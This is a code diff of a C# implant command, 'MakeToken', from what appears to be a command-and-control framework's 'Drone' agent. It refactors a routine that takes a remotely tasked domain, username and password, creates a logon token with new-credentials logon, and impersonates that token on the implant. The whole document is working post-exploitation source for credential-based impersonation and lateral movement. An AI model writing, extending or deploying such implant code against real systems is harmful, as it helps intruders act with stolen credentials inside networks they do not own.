@@ -2,48 +2,40 @@
 using System.ComponentModel;
 using System.Runtime.InteropServices;
 using System.Threading;
-using System.Threading.Tasks;
-
-using Drone.Models;
-using Drone.Utilities;
 
 namespace Drone.Commands;
 
+using static Interop.Methods;
+using static Interop.Data;
+
 public sealed class MakeToken : DroneCommand
 {
-    public override byte Command => 0x14;
-    
-    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
-    {
-        var userDomain = task.Arguments[0].Split('\\');
-            
-        var domain = userDomain[0];
-        var username = userDomain[1];
-        var password = task.Arguments[1];
+    public override byte Command => 0x2A;
+    public override bool Threaded => false;
 
-        // create token
-        var hToken = Win32.LogonUserW(
-            username,
-            domain,
-            password,
-            Win32.LOGON_USER_TYPE.LOGON32_LOGON_NEW_CREDENTIALS,
-            Win32.LOGON_USER_PROVIDER.LOGON32_PROVIDER_DEFAULT);
+    public override void Execute(DroneTask task, CancellationToken cancellationToken)
+    {
+        var split = task.Arguments[0].Split('\\');
+
+        var hToken = LogonUserW(
+            split[1],
+            split[0],
+            task.Arguments[1],
+            LOGON_USER_TYPE.LOGON32_LOGON_NEW_CREDENTIALS,
+            LOGON_USER_PROVIDER.LOGON32_PROVIDER_WINNT50);
 
         if (hToken == IntPtr.Zero)
             throw new Win32Exception(Marshal.GetLastWin32Error());
         
-        // revert first
-        Win32.RevertToSelf();
-        
-        // impersonate token
-        var success = Win32.ImpersonateToken(hToken);
+        RevertToSelf();
 
-        if (!success)
+        if (!ImpersonateToken(hToken))
+        {
+            CloseHandle(hToken);
             throw new Win32Exception(Marshal.GetLastWin32Error());
-        
-        await Drone.SendOutput(task, $"Impersonated token for {domain}\\{username}.");
-        
-        // set token on drone
+        }
+
         Drone.ImpersonationToken = hToken;
+        Drone.SendTaskComplete(task.Id);
     }
 }
